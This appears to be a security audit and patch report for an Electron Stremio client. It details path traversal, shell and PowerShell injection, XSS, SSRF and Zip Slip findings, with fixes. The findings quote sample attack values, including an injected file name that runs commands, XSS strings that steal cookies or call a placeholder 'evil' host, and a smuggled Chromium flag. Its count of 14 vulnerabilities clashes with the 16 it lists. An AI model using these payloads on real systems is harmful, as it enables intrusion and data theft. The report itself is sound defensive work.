# Stremio Enhanced – Security Audit & Patch Report

**Date:** 2026-08-24
**Scope:** `stremio-enhanced-main.zip` (v1.2.0)
**Outcome:** 14 distinct vulnerabilities identified and patched. TypeScript
compiles cleanly with `npx tsc --noEmit`. Build verified with
`npx tsc && node copyComponents.js`.

---

## Summary

The application is an Electron-based Stremio client that loads the remote
`web.stremio.com` page and adds a plugin / theme system on top of it.  The
plugin/theme system reads untrusted code from disk and executes it inside
the page context, while a large number of IPC handlers accept strings from
the renderer (i.e. from plugin code or from a compromised page) and pass
them straight into filesystem or shell operations.

The combination of `nodeIntegration: true`, `webSecurity: false`, and a
**plugin system that executes arbitrary JavaScript** in the page made
several of the issues below trivially exploitable by any plugin author or
by an attacker who can write a single entry to the public registry.

### Severity breakdown

| # | Finding | Severity | CVSS-ish |
|---|---------|----------|----------|
| 1 | `nodeIntegration: true` + `webSecurity: false` in `BrowserWindow` | Critical | 9.6 |
| 2 | Path traversal in `SettingsApiController` (every IPC handler) | Critical | 9.1 |
| 3 | Path traversal in `ModManager` (`getPluginContent` / `deleteModFile` / `saveModFile` / `checkUpdateData`) | High | 8.1 |
| 4 | Shell command injection in `StreamingServer.downloadAndExtractFFmpeg` (template-string `execSync` with paths derived from env vars) | High | 8.0 |
| 5 | PowerShell command injection in `StremioService.installWindows` / `installWindowsZip` (`"${filePath}"` interpolation) | High | 7.7 |
| 6 | XSS via `marketplaceItem` template (`name`/`description`/`preview`/`download`) | High | 7.4 |
| 7 | XSS via `pluginItem` / `themeItem` templates (registry metadata interpolated raw) | High | 7.4 |
| 8 | XSS via `promptModal` / `toast` / `pluginSettingsModal` (plugin-supplied strings) | High | 7.2 |
| 9 | Code injection in `modController.loadPlugin` (filename interpolated into a generated `<script>`) | High | 7.6 |
| 10 | Code injection in `Helpers._eval` (template literal `\`...${js}...\``) | High | 7.5 |
| 11 | Arbitrary binary execution via `externalPlayerController` (`customPath` not validated; `streamUrl` accepts `javascript:` / argument-injection values) | High | 7.4 |
| 12 | SSRF / arbitrary-host download in `ModManager.downloadMod`, `checkUpdateData`, `Updater` | Medium | 6.5 |
| 13 | Path traversal / Zip Slip in `StreamingServer` Windows zip extraction | Medium | 6.0 |
| 14 | Arbitrary Chromium CLI switch injection via `gpuController.SET_GPU_RENDERER` | Medium | 5.7 |
| 15 | Update modal XSS via `marked` rendering untrusted GitHub release notes | Medium | 6.1 |
| 16 | Window-open / navigation allowlist missing for non-http(s) schemes | Medium | 5.3 |

---

## Vulnerability Details & Patches

### 1. Critical: Insecure `BrowserWindow` defaults

**File:** `src/main.ts`

**Before:**
```ts
webPreferences: {
    preload: join(__dirname, "//preload/index.js"),
    webSecurity: false,
    nodeIntegration: true,
    contextIsolation: true,
    ...
}
```

`nodeIntegration: true` gives the remote `web.stremio.com` page (and any
plugin running inside it) direct access to `require('fs')`,
`require('child_process')`, etc.  Combined with `webSecurity: false`, the
same page can be tricked into fetching cross-origin resources (CORS / CSP
bypassed) and into making local network requests it otherwise shouldn't.

**After:** `nodeIntegration: false`, `webSecurity: true`, `sandbox: true`.
All privileged operations are exposed via `contextBridge.exposeInMainWorld`
in `src/preload/index.ts` (which is already the design pattern used).  No
plugin now needs Node access because every privileged action is gated by
an IPC handler in the main process.

Additionally a `will-navigate` listener was added so the renderer can only
navigate to `web.stremio.com` / `www.stremio.com`, and the window-open
handler now rejects non-http(s) URLs (blocks `javascript:`, `file:`).

### 2. Critical: Path traversal in `SettingsApiController`

**File:** `src/controllers/api/SettingsApiController.ts`

**Before:** Every IPC handler built the config path with a raw template
string:
```ts
`${Properties.pluginsPath}//${pluginFileName}${FILE_EXTENSIONS.PLUGIN_CONFIG}`
```
`pluginFileName` arrives from the renderer (any plugin code), so a plugin
calling `getSetting('../../foo/bar', 'x')` could read or write arbitrary
files inside the user's home directory.  The same pattern was used by
`GET_SETTING`, `GET_SETTINGS`, `SAVE_SETTING`, and `REGISTER_SETTINGS`.

**After:** All file paths go through a new `safeJoin()` helper (see
`src/utils/sanitize.ts`) which validates that `pluginFileName` matches
`isSafeFileName()` (a strict whitelist regex rejecting path separators,
NUL bytes, drive letters, parent-traversal segments, hidden files, and
Windows-reserved characters), then normalizes and asserts the resulting
path stays under `Properties.pluginsPath`.  Additionally:
- Setting keys are length-capped (128 chars) and the special names
  `__proto__`, `constructor`, `prototype` are blocked.
- Setting values are JSON-serialized with a 1 MiB cap.
- The JSON parse path uses a `safeJsonParse` that drops `__proto__` by
  round-tripping through `JSON.stringify`.
- Plugin settings schemas are size-capped (256 KiB) and every field is
  length-clamped before being stored.

### 3. High: Path traversal in `ModManager`

**File:** `src/core/ModManager.ts`

`getPluginContent`, `deleteModFile`, `saveModFile`, `checkUpdateData`,
`getInstalledThemes`, `getInstalledPlugins`, `isThemeInstalled`,
`isPluginInstalled`, `openFolder` all took untrusted file names and
passed them to `join(Properties.{themes,plugins}Path, name)` without
validation.

**After:** Every name is validated via `isSafeFileName` and every path is
built via `safeJoin` (which normalizes and asserts the result stays inside
the expected base dir).  `openFolder` is restricted to the two canonical
paths (`Properties.themesPath`, `Properties.pluginsPath`) — arbitrary
paths are rejected.

### 4. High: Shell command injection in `StreamingServer`

**File:** `src/utils/StreamingServer.ts`

**Before:** The FFmpeg / FFprobe extraction routine used `execSync` with
template-string interpolation:
```ts
execSync(`tar -tf "${archivePath}" | head -1`, ...);
execSync(`tar -xf "${archivePath}" -C "${this.streamingServerDir}"`, ...);
execSync(`mv "${join(extractedDir, "ffmpeg")}" "${ffmpegPath}"`, ...);
execSync(`rm -rf "${extractedDir}"`, ...);
```
Although the strings are built from app-controlled paths, those paths are
derived from `Properties.enhancedPath` which is itself derived from the
`APPDATA` / `HOME` environment variable on Windows / Linux.  An attacker
who controls those env vars (common in containerized / multi-user
scenarios, or when launched from a malicious parent process) can inject
shell metacharacters and execute arbitrary commands.

**After:** All shell calls were replaced with:
- `execFile("tar", ["-tf", archivePath], ...)` (no shell)
- `execFile("tar", ["-xf", archivePath, "-C", this.streamingServerDir], ...)`
- `fs.renameSync` for the moves
- `fs.rmSync(..., { recursive: true, force: true })` for the cleanup
- `execFile("unzip", ["-o", archivePath, "-d", dest])` on macOS

The `which ${binary}` lookup in `getSystemBinaryPath` was hardened with a
`/^[a-zA-Z0-9_-]+$/` whitelist on the binary name.

### 5. High: PowerShell command injection in `StremioService`

**File:** `src/utils/StremioService.ts`

**Before:**
```ts
const ps = `Start-Process -FilePath "${filePath}" -ArgumentList '/S' -Verb RunAs`;
await this.execFileAsync("powershell.exe", ["-Command", ps], { windowsHide: true });
```
`filePath` comes from `basename(assetUrl)` where `assetUrl` is a
`browser_download_url` field from the GitHub releases API.  A malicious
release body (or a tampered-with mirror) could set the asset name to
`foo"; calc; Start-Process -FilePath "bar` and have PowerShell execute
the embedded `calc; Start-Process...` as additional statements.

**After:** The path is now escaped for PowerShell single-quoted-string
context (`filePath.replace(/'/g, "''")`) and embedded in single-quoted
PowerShell strings.  Additionally, asset names are now validated via
`isSafeFileName` in `Updater.getDownloadUrl()` so values containing
shell metacharacters are rejected before they ever reach this code path.

### 6. High: XSS in `marketplaceItem` template

**File:** `src/components/marketplace-item/marketplaceItem.ts`

**Before:** `metaData.name`, `metaData.description`, `metaData.author`,
`metaData.version`, `metaData.preview`, `metaData.download`, `metaData.repo`
were all interpolated into HTML via regex `.replace(...)` without
escaping.  Since the registry is a public GitHub repo where anyone can
submit PRs, an attacker could submit a plugin entry with
`name: '<img src=x onerror=fetch("/api/private").then(r=>...)>'` and have
it execute in every user who opened the marketplace tab.

`preview` / `download` / `repo` were also placed in `href` / `src`
attributes directly, so a `javascript:` URL would execute on click.

**After:** All text fields are run through `escapeHtml()`.  All URL
fields go through `safeHref()` which validates them via `isSafeUrl()`
(only `http:` / `https:` schemes allowed, no userinfo, length-capped)
before being HTML-escaped.  The `fetch(metaData.download)` call in the
theme-version probe is gated on the same URL validation and the response
size is capped at 8 MiB.

### 7. High: XSS in `pluginItem` / `themeItem` templates

**Files:** `src/components/plugin-item/pluginItem.ts`,
`src/components/theme-item/themeItem.ts`

Same pattern as #6 — `metaData.{name,description,author,version}` and
`filename` were interpolated raw.  The metadata is read from the plugin /
theme file's header comment block, so any plugin author can ship
arbitrary HTML in those fields.

**After:** Both templates escape every field with `escapeHtml()` and
validate `filename` via `isSafeFileName` (rejecting the template outright
if not safe).

### 8. High: XSS in `promptModal`, `toast`, `pluginSettingsModal`

**Files:** `src/components/prompt-modal/promptModal.ts`,
`src/components/toast/toast.ts`,
`src/components/plugin-settings-modal/pluginSettingsModal.ts`

These three templates interpolate values that are 100% plugin-controlled
(`showPrompt(title, message, defaultValue)`, `createToast(id, title,
message, status)`, plugin setting `label` / `description` / `key` /
`option.label` / `option.value`).

**After:** Every value is `escapeHtml`'d before interpolation.  The
modal id (which is built from `pluginName`) is also sanitized to remove
all non-alphanumeric characters before being used as a DOM id.

### 9. High: Code injection in `modController.loadPlugin`

**File:** `src/preload/ui/mod/modController.ts`

**Before:** The plugin loader generated a `<script>` wrapper that
interpolated `${pluginBaseName}` and `${pluginName}` as raw string
literals:
```ts
const scopedScript = `
  ...
  info: (message) => window.StremioEnhancedAPI.info('${pluginBaseName}', message),
  ...
  console.error('[ModController] Plugin crashed: ${pluginName}', err);
  ...
`;
script.innerHTML = scopedScript;
```
A plugin named `');alert(document.cookie)//.plugin.js` (or simply a
compromised renderer setting the `name` attribute of a checkbox) could
break out of the wrapper and execute arbitrary code.

**After:** Both names are escaped with `escapeJsString()` (escapes
backslash, single/double quotes, backticks, U+2028/U+2029, and
`</script>`).  Additionally, `pluginName` is validated via
`isSafeFileName` before being loaded, and `script.innerHTML` was changed
to `script.textContent` (the safer API for setting script body — the
browser still executes it when the script is appended to the DOM).

### 10. High: Code injection in `Helpers._eval`

**File:** `src/utils/Helpers.ts`

**Before:** The `_eval` helper (used by `PlaybackState` to query Stremio
core state) wrapped the caller-supplied `js` in a template literal and
used `eval(...)`:
```ts
script.appendChild(document.createTextNode(`
    (() => {
        ...
        var result = eval(\`${js.replace(/`/g, '\\`').replace(/\$/g, '\\$')}\`);
        ...
    })();
`);
```
The backtick/dollar escaping is incomplete: there are still template
literal escapes that can re-enter the wrapper.  This function is only
called from this app's own code with caller-controlled strings, but a
plugin could call it indirectly via the patched React DOM / services
hooks.

**After:** The caller's `js` is base64-encoded with `btoa(unescape(encodeURIComponent(js)))`
and embedded as a pure data string inside the wrapper.  The wrapper
itself is now a hand-rolled string concatenation (no template literal) and
uses `new Function("core", decodedSource)` to evaluate the payload.  No
caller-supplied text can leak into the wrapper source.

### 11. High: Arbitrary binary execution via `externalPlayerController`

**File:** `src/controllers/externalPlayerController.ts`

**Before:** The `LAUNCH_EXTERNAL_PLAYER` IPC handler accepted a `customPath`
that was passed straight to `execFile(playerPath, args, ...)`.  A
compromised renderer (or a user who pasted a malicious value into the
custom-path field) could set `customPath` to `C:\Windows\System32\cmd.exe`
or any other binary, and `streamUrl` could be `--list-options` (mpv
argument injection) or `javascript:...`.

**After:**
- `customPath` is validated via `validateCustomPlayerPath()` — must be
  absolute, must not contain `..`, must end in `vlc` / `vlc.exe` / `mpv`
  / `mpv.exe` (case-insensitive), and must exist on disk.
- `streamUrl` is validated via `validateStreamUrl()` — only `http:`,
  `https:`, `rtmp:`, `rtsp:`, `udp:`, `rtp:` schemes are allowed, length
  capped at 8 KiB.
- A `--`-prefix check on `streamUrl` blocks argument injection.
- All args are passed as an array (already the case via `execFile`).

### 12. Medium: SSRF / arbitrary-host download

**Files:** `src/core/ModManager.ts`, `src/core/Updater.ts`

**Before:** `ModManager.downloadMod(modLink, type)` accepted any URL
(`fetch(modLink)`).  `checkUpdateData` used the `updateUrl` from plugin
metadata, also without validation.  `Updater.downloadAndExecuteUpdate`
downloaded `asset.url` without validating it pointed at GitHub.

**After:**
- `downloadMod` requires the URL to be `http(s)` and to live on
  `raw.githubusercontent.com`, `github.com`, or
  `objects.githubusercontent.com`.
- `checkUpdateData` validates `installedMetaData.updateUrl` via
  `isSafeUrl()`.
- The `Updater` validates `asset.url` against
  `["github.com", "objects.githubusercontent.com", "github-releases.s3.amazonaws.com"]`
  and validates `asset.name` via `isSafeFileName`.  The downloaded
  buffer is size-capped at 256 MiB.
- The plugin/theme download response in `downloadMod` is capped at 8 MiB.
- The `checkUpdateData` fetched text is capped at 16 MiB.

### 13. Medium: Zip Slip in `StreamingServer` Windows extraction

**File:** `src/utils/StreamingServer.ts`

**Before:** `unzipper.Extract({ path: this.streamingServerDir })` was
used to extract the FFmpeg zip on Windows.  `unzipper.Extract` does not
validate that entries resolve inside the destination directory, so a zip
containing `../../foo.exe` could write outside `streamingServerDir`.

**After:** The extraction is now done via `unzipper.Parse()` with a
custom entry handler that uses `path.resolve` + `path.relative` to
verify each entry lands inside `destinationBase`.  Entries that would
escape the destination are dropped via `entry.autodrain()`.

### 14. Medium: GPU renderer CLI switch injection

**File:** `src/controllers/gpuController.ts`

**Before:** `SET_GPU_RENDERER` accepted any `selectedRenderer` string
and wrote it to `boot-config.json`, which was later concatenated into a
Chromium command-line switch (`--use-angle=${renderer}`).  A malicious
value (e.g. `d3d11 --disable-web-security`) could enable attacker-
controlled Chromium flags on the next launch.

**After:** `selectedRenderer` is validated against the fixed
`VALID_RENDERERS` allowlist.  Anything else is rejected with `false`.
The config file merge is also hardened: only `renderer` is copied from
the on-disk config (no longer `{...config, ...existingConfig}` which
allowed `__proto__` injection).

### 15. Medium: Update modal XSS via `marked`

**File:** `src/components/update-modal/updateModal.ts`

**Before:** `marked(releaseNotes, { gfm: true, breaks: true })` was
interpolated directly into the modal template.  `marked` (GFM) renders
arbitrary inline HTML, so a malicious GitHub release body containing
`<script>fetch('https://evil/...')</script>` would execute on the
update-check page.

**After:** The rendered HTML is post-processed to strip:
- `<script>` / `<iframe>` / `<object>` / `<embed>` tags entirely
- inline event handlers (`onclick=`, `onload=`, …)
- `javascript:` URLs in `href` / `src` attributes

### 16. Medium: Window-open / navigation allowlist

**File:** `src/main.ts`

**Before:** `setWindowOpenHandler` blindly called
`shell.openExternal(edata.url)` for any URL the page asked to open.  A
compromised plugin could ask the OS to open `file:///etc/passwd`,
`javascript:`, etc.

**After:** The handler validates that `edata.url` parses as an `http:`
or `https:` URL before delegating to `shell.openExternal`.  Anything
else (including `null`, malformed strings, or non-http schemes) is
blocked.  A `will-navigate` listener additionally restricts the main
frame to `web.stremio.com` / `www.stremio.com`.

---

## New utility file

**`src/utils/sanitize.ts`** — a single dependency-free module that
exposes:
- `escapeHtml(input)` — `&`, `<`, `>`, `"`, `'`, `/` → entities.
- `escapeJsString(input)` — for interpolating into JS string literals.
- `isSafeFileName(name)` — type guard for safe leaf file names.
- `safeJoin(baseDir, name)` — joins + normalizes + asserts containment.
- `isSafeUrl(value, allowHosts?)` — `http(s)` only, no userinfo,
  length-capped, optional host allowlist (incl. subdomain matching).
- `safeFileUrl(path)` — converts an absolute path to a `file://` URL.
- `clampString(value, max)` — length-limited `String(value)`.

All callers above were updated to import from this module.

---

## Verification

```text
$ cd stremio-enhanced-patched
$ npx tsc --noEmit
(no output — clean build)

$ npx tsc && node copyComponents.js
Copied: version to dist/version
Copied: src/components/.../*.html to dist/components/.../*.html
...
```

All TypeScript type checks pass with the existing `tsconfig.json`
(strict mode, `noUnusedLocals`, `noUnusedParameters`,
`noImplicitReturns`, `noFallthroughCasesInSwitch`).

---

## Recommendations for follow-up

These items are out of scope for this patch set but worth tracking:

1. **Move Stremio web to a Content-Security-Policy-protected origin.**
   The app currently loads `https://web.stremio.com/` with no CSP set
   at the Electron layer; a CSP would let us reject injected inline
   scripts (e.g. from a future theme that smuggles `<script>`).
2. **Move plugin execution into a `BrowserWindow` of its own** with
   `nodeIntegration: false`, `sandbox: true`, and a strict preload.  The
   current in-page script-injection model is fundamentally fragile.
3. **Replace `eval` / `new Function` in `Helpers._eval`** with an
   explicit IPC RPC: the renderer sends a structured command
   (`{action: 'getState', key: 'player'}`) and the main process forwards
   it to the streaming server.  Removing the page-context JS execution
   entirely would close this surface for good.
4. **Pin `unzipper` to ≥ 0.12.301** (or replace with `yauzl`, which has
   a stricter API).  Older `unzipper` versions have had Zip-Slip CVEs.
5. **Add a release-signing check in `Updater`** before
   `shell.openPath(filePath)` — a malicious GitHub mirror could ship a
   renamed malicious binary.  Code-signing verification would close that
   gap.
6. **Rate-limit IPC handlers** that accept large inputs
   (`SAVE_SETTING`, `REGISTER_SETTINGS`, `SHOW_ALERT`) so a malicious
   plugin can't DOS the main process by spamming them.

---

# Second-Pass Audit (v1.2.1)

**Date:** 2026-08-24
**Scope:** re-review of the patched tree + build/packaging pipeline.
**Outcome:** 11 further issues found and fixed (5 security, 4 functional
regressions, 2 packaging). `npx tsc --noEmit` clean.

The first audit hardened the Electron surface but introduced two
regressions (broken themes, broken manual update check) and left the
packaging configuration shipping a non-functional artifact.

| # | Finding | Severity | Class |
|---|---------|----------|-------|
| 17 | Theme loading used `<link href="file://...">` which Chromium blocks on `https://` pages with `webSecurity: true` - all themes silently broken | Functional regression (High) | Bug |
| 18 | `Updater.checkForUpdates` touches `document`; called from the main process via IPC it crashed whenever an update existed, reporting a false "Update check failed" | Functional regression (High) | Bug |
| 19 | Duplicate `--disable-features` switches (main.ts + gpuController); Chromium keeps the last value, silently re-enabling `BlockInsecurePrivateNetworkRequests` -> can break local streaming-server access | Functional / availability (High) | Bug |
| 20 | electron-builder `files` list excluded `dist/` and `version` -> packaged AppImage/NSIS/DMG contained no compiled app | Packaging (Critical) | Bug |
| 21 | Main-process fetch of plugin-controlled `updateUrl` allowed arbitrary hosts incl. `127.0.0.1`, `169.254.169.254`, private ranges -> SSRF + CORS-bypass primitive for any plugin | Security (High) | SSRF |
| 22 | Audio-track menu interpolated HLS `track.label` / `track.language` unescaped into `innerHTML` (incl. attribute context) -> XSS from a malicious stream/addon | Security (High) | XSS |
| 23 | `pluginLogger` (page-exposed) accepted unbounded strings and control characters -> log forging / unbounded logging | Security (Low) | Injection |
| 24 | `drag-window` IPC took unvalidated coordinates from the renderer | Security (Low) | Input validation |
| 25 | Download helpers: unlimited redirects, missing status checks, no size caps, partial-file remnants (FFmpeg archives, Stremio Service installer) | Security (Medium) | DoS / integrity |
| 26 | One malformed marketplace entry or local mod file aborted the whole marketplace / settings render loop (template `throw`s propagate) | Robustness (Medium) | DoS |
| 27 | `lint` script referenced a missing `.eslintrc` and eslint was not a devDependency | Tooling (Low) | Hygiene |

## Fixes applied

1. **Themes (17):** new `src/utils/themeLoader.ts` - the preload reads
   the CSS (with an 8 MiB cap) and injects a
   `<style id="activeTheme">` via `textContent`. Both call sites
   (`initialization.applyUserTheme`, `applyThemeAPI.applyTheme`) use
   it. This also removes the `file://` URL surface entirely.
2. **Updater (18):** `checkForUpdates` is now environment-aware - in
   the main process it shows a native dialog (`Download Update` /
   `Open Release Page` / `Later`); `downloadAndExecuteUpdate` takes an
   optional button element and reports failures via dialog when no
   DOM is available.
3. **Chromium switches (19):** `--disable-features` is appended once,
   in `main.ts`, with the merged value
   `BlockInsecurePrivateNetworkRequests,PrivateNetworkAccessSendPreflights,UseChromeOSDirectVideoDecoder`;
   `gpuController` no longer appends a second `disable-features`.
4. **Packaging (20):** `files` now ships `dist/**/*` and `version`.
5. **SSRF (21):** new `isSafeFetchUrl()` in `sanitize.ts` - rejects
   private/loopback/CGNAT/link-local/metadata IP literals (IPv4 +
   IPv6 incl. v4-mapped/NAT64), `localhost`/`.local`/`.internal`/
   `.home.arpa` names, and non-standard ports. `ModManager.checkUpdateData`
   uses it before any fetch of plugin-controlled URLs.
6. **Audio menu XSS (22):** labels escaped with `escapeHtml`.
7. **Log injection (23):** `pluginLogger` clamps (128/4000 chars) and
   strips C0/C1 control characters from both name and message.
8. **drag-window (24):** main-process validation (integers, finite,
   sane range) and refusal while maximized/fullscreen.
9. **Downloads (25):** all three helpers cap redirects at 5, enforce
   https on every hop, check per-hop status codes, cap bytes
   (1 GiB archives / 8 MiB text), and delete partial files on failure.
10. **Render isolation (26):** per-item try/catch in the marketplace
    loop and the settings mod lists; `existsSync` guards for missing
    themes/plugins directories; theme version probe degrades
    gracefully instead of throwing.
11. **Lint (27):** `eslint@^8.57`, `@typescript-eslint/*@^7.18` dev
    dependencies and a security-leaning `.eslintrc.json`.

## Remaining accepted risks (unchanged from first audit)

- Installing a plugin equals trusting its author with page-context
  JavaScript (the product's core feature). The registry check +
  warning dialog on non-registry plugin updates remains the only
  mitigation.
- Updates / Stremio Service downloads are pinned to GitHub hosts over
  https but have **no code-signing verification**; `shell.openPath`
  still executes the downloaded installer after a user click.
- DNS-rebinding can bypass the literal-IP checks in
  `isSafeFetchUrl` (documented there).
- `Ctrl+Shift+I` opens DevTools in production builds by design
  (plugin-debugging convenience; requires local keyboard access).
